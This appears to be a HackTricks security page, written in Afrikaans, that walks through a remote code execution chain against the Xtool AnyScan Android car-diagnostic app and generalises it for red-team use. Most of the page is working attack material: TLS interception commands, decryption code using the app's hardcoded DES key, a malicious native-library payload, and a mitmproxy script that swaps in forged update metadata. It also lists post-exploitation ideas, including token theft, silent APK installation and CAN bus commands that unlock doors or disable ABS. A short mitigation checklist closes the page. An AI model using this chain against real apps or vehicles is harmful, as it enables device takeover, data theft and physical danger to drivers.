# Onveilige In-App Opdateringsmeganismes – Afgeleide Kode-uitvoering via Kwaadwillige Plugins

{{#include ../../banners/hacktricks-training.md}}

Baie Android-toepassings implementeer hul **eie “plugin” of “dinamiese kenmerk” opdateringskanale** in plaas van om die Google Play Store te gebruik. Wanneer die implementering onveilig is, kan 'n aanvaller wat die verkeer kan onderskep **arbitraire nativ kode verskaf wat binne die app-proses gelaai sal word**, wat lei tot volle Afgeleide Kode-uitvoering (RCE) op die toestel – en in sommige gevalle op enige eksterne toestel wat deur die app beheer word (motors, IoT, mediese toestelle …).

Hierdie bladsy som 'n werklike kwesbaarheidsketting op wat in die Xtool **AnyScan** motor-diagnose app (v4.40.11 → 4.40.40) gevind is en generaliseer die tegniek sodat jy ander Android-toepassings kan auditeer en die mis-konfigurasie kan wapen tydens 'n rooi-span betrokkenheid.

---
## 1. Identifisering van 'n Onveilige TLS TrustManager

1. Decompileer die APK met jadx / apktool en lokaliseer die netwerkstapel (OkHttp, HttpUrlConnection, Retrofit…).
2. Soek vir 'n **aangepaste `TrustManager`** of `HostnameVerifier` wat blindelings elke sertifikaat vertrou:
```java
public static TrustManager[] buildTrustManagers() {
return new TrustManager[]{
new X509TrustManager() {
public void checkClientTrusted(X509Certificate[] chain, String authType) {}
public void checkServerTrusted(X509Certificate[] chain, String authType) {}
public X509Certificate[] getAcceptedIssuers() {return new X509Certificate[]{};}
}
};
}
```
3. As dit teenwoordig is, sal die aansoek **enige TLS-sertifikaat** aanvaar → jy kan 'n deursigtige **MITM-proxy** met 'n self-ondertekende sertifikaat laat loop:
```bash
mitmproxy -p 8080 -s addon.py  # see §4
iptables -t nat -A OUTPUT -p tcp --dport 443 -j REDIRECT --to-ports 8080  # on rooted device / emulator
```
## 2. Omgekeerde Ingenieurswese van die Opdatering Metadata

In die AnyScan geval aktiveer elke app-lancering 'n HTTPS GET na:
```
https://apigw.xtoolconnect.com/uhdsvc/UpgradeService.asmx/GetUpdateListEx
```
Die responsliggaam is 'n **XML-dokument** waarvan die `<FileData>` knope **Base64-gecodeerde, DES-ECB versleutelde** JSON bevat wat elke beskikbare plugin beskryf.

Tipiese jagstappe:
1. Vind die kripto-routine (bv. `RemoteServiceProxy`) en herstel:
* algoritme (DES / AES / RC4 …)
* werkingmodus (ECB / CBC / GCM …)
* hard-gecodeerde sleutel / IV (dikwels 56-bis DES sleutels of 128-bis AES sleutels in konstantes)
2. Her-implementeer die funksie in Python om die metadata te ontsleutel / te versleutel:
```python
from Crypto.Cipher import DES
from base64 import b64decode, b64encode

KEY = IV = b"\x2A\x10\x2A\x10\x2A\x10\x2A"  # 56-bit key observed in AnyScan

def decrypt_metadata(data_b64: str) -> bytes:
cipher = DES.new(KEY, DES.MODE_ECB)
return cipher.decrypt(b64decode(data_b64))

def encrypt_metadata(plaintext: bytes) -> str:
cipher = DES.new(KEY, DES.MODE_ECB)
return b64encode(cipher.encrypt(plaintext.ljust((len(plaintext)+7)//8*8, b"\x00"))).decode()
```
## 3. Skep 'n Kwaadwillige Plugin

1. Kies enige legitieme plugin ZIP en vervang die inheemse biblioteek met jou payload:
```c
// libscan_x64.so – constructor runs as soon as the library is loaded
__attribute__((constructor))
void init(void){
__android_log_print(ANDROID_LOG_INFO, "PWNED", "Exploit loaded! uid=%d", getuid());
// spawn reverse shell, drop file, etc.
}
```

```bash
$ aarch64-linux-android-gcc -shared -fPIC payload.c -o libscan_x64.so
$ zip -r PWNED.zip libscan_x64.so assets/ meta.txt
```
2. Werk die JSON-metadata op sodat `"FileName" : "PWNED.zip"` en `"DownloadURL"` na jou HTTP-bediener wys.
3. DES-enkripteer + Base64-kodeer die gewysigde JSON en kopieer dit terug binne die onderskepte XML.

## 4. Lewer die Payload met mitmproxy

`addon.py` voorbeeld wat *stilweg* die oorspronklike metadata verwissel:
```python
from mitmproxy import http
MOD_XML = open("fake_metadata.xml", "rb").read()

def request(flow: http.HTTPFlow):
if b"/UpgradeService.asmx/GetUpdateListEx" in flow.request.path:
flow.response = http.Response.make(
200,
MOD_XML,
{"Content-Type": "text/xml"}
)
```
Voer 'n eenvoudige webbediener uit om die kwaadwillige ZIP te huisves:
```bash
python3 -m http.server 8000 --directory ./payloads
```
Wanneer die slagoffer die app begin, sal dit:
* ons vervalste XML oor die MITM-kanaal verkry;
* dit met die hard-gecodeerde DES-sleutel ontcijfer en ontleed;
* `PWNED.zip` aflaai → uitpak binne private stoor;
* `dlopen()` die ingeslote *libscan_x64.so*, wat ons kode onmiddellik uitvoer **met die app se toestemmings** (kamera, GPS, Bluetooth, lêerstelsel, …).

Omdat die plugin op skyf geberg is, **bly die agterdeur oor herlaai** en loop elke keer wanneer die gebruiker die verwante funksie kies.

## 5. Post-Exploitation Idees

* Steel sessie koekies, OAuth tokens, of JWTs wat deur die app gestoor word.
* Laat 'n tweede-fase APK val en installeer dit stilweg via `pm install` (die app het reeds `REQUEST_INSTALL_PACKAGES`).
* Misbruik enige gekonnekteerde hardeware – in die AnyScan-scenario kan jy arbitrêre **OBD-II / CAN bus opdragte** stuur (deure ontgrendel, ABS deaktiveer, ens.).

---
### Opsporing & Versagting Kontrolelys (blou span)

* NOOIT 'n produksiebou met 'n pasgemaakte TrustManager/HostnameVerifier wat sertifikaatvalidasie deaktiveer, verskeep nie.
* Moet nie uitvoerbare kode van buite Google Play aflaai nie. As jy *moet*, teken elke plugin met dieselfde **apkSigning v2** sleutel en verifieer die handtekening voordat jy laai.
* Vervang swak/hard-gecodeerde kripto met **AES-GCM** en 'n bediener-kant draaiende sleutel.
* Verifieer die integriteit van afgelaaide argiewe (handtekening of ten minste SHA-256).

---
## Verwysings

- [NowSecure – Remote Code Execution Discovered in Xtool AnyScan App](https://www.nowsecure.com/blog/2025/07/16/remote-code-execution-discovered-in-xtool-anyscan-app-risks-to-phones-and-vehicles/)
- [Android – Unsafe TrustManager patterns](https://developer.android.com/privacy-and-security/risks/unsafe-trustmanager)

{{#include ../../banners/hacktricks-training.md}}
